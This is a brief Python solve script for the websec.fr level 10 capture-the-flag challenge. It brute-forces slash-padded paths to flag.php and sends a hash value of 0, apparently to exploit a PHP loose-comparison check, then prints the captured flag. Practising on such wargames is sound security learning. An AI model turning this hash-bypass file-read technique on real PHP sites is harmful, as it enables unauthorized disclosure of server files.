from requests import *
import sys

url = 'http://websec.fr/level10/index.php'
f = './flag'

for i in range (100000):
    data = {
        'f' : f,
        'hash' : 0,
    }
    r = post(url , data=data)
    
    if (r.text.find('Permission denied!') != -1):
        print ('failed')
        f = '.' + '/' * i + 'flag.php'
    else:
        pos = r.text.find('WEBSEC{')
        while (True):
            txt = r.text[pos]
            print(txt , end='')
            if (txt == '}'):
                print()
                break

            pos += 1
        sys.exit()
